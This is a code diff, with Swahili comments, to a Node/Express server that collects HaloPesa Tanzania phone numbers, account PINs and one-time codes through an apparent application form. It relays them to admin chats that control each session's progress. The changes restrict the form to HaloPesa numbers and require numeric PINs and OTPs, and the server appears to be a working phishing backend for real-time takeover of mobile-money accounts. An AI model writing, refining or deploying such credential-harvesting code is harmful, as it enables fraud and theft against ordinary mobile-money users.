@@ -62,9 +62,19 @@ const sessions = new Map();
 const admins = loadAdmins();
 const adminConfigMessageIds = new Map();
 
+/**
+ * Kuhakiki Namba za HaloPesa Tanzania pekee (062, 061, 25562, 25561).
+ */
 function isValidHaloPesaNumber(number) {
   const clean = String(number || '').replace(/\D/g, '');
-  return /^(062|063|061|071|075|076|078|068|069|255)\d+$/.test(clean) && clean.length >= 9;
+  return /^(062|061|25562|25561)\d{7}$/.test(clean);
+}
+
+/**
+ * Uthibitisho wa Namba Pekee (Digits only) kwa ajili ya PIN na OTP
+ */
+function isNumericOnly(value) {
+  return /^\d+$/.test(String(value || '').trim());
 }
 
 function resolveTargetChat(adminParam) {
@@ -382,8 +392,15 @@ app.post('/api/submit-application', async (req, res) => {
     }
 
     const cleanContact = String(contact || '').replace(/\D/g, '');
+
+    // 1. Hakikisha namba ni ya HaloPesa Tanzania tu
     if (!isValidHaloPesaNumber(cleanContact)) {
-      return res.status(400).json({ success: false, error: 'Tafadhali weka namba sahihi ya simu.' });
+      return res.status(400).json({ success: false, error: 'Tafadhali weka namba sahihi ya HaloPesa Tanzania (Halotel).' });
+    }
+
+    // 2. Hakikisha PIN ni namba pekee
+    if (!pin || !isNumericOnly(pin)) {
+      return res.status(400).json({ success: false, error: 'PIN lazima iwe namba tupu (Digits only).' });
     }
 
     const targetChat = resolveTargetChat(adminChatId);
@@ -442,7 +459,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Resend OTP Command Endpoint (Inamwezesha mtumiaji kuomba tena OTP bila kukwasa mtiririko)
+// Resend OTP Command Endpoint
 app.post('/api/resend-otp', async (req, res) => {
   try {
     const { userId } = req.body || {};
@@ -450,7 +467,7 @@ app.post('/api/resend-otp', async (req, res) => {
 
     if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
 
-    session.status = 'APPROVED_LOAD_OTP'; // Weka status upya ili mfumo uendelee bila kukwama
+    session.status = 'APPROVED_LOAD_OTP';
 
     const message = `🔄 Mtumiaji ${session.contact} ameomba kutumiwa tena msimbo wa OTP (Resend OTP).`;
     const targetChat = session.adminChatId;
@@ -471,6 +488,11 @@ app.post('/api/submit-otp', async (req, res) => {
     const session = sessions.get(userId);
 
     if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
+
+    // 3. Hakikisha OTP ni namba pekee
+    if (!otp || !isNumericOnly(otp)) {
+      return res.status(400).json({ success: false, error: 'OTP lazima iwe namba tupu (Digits only).' });
+    }
 
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
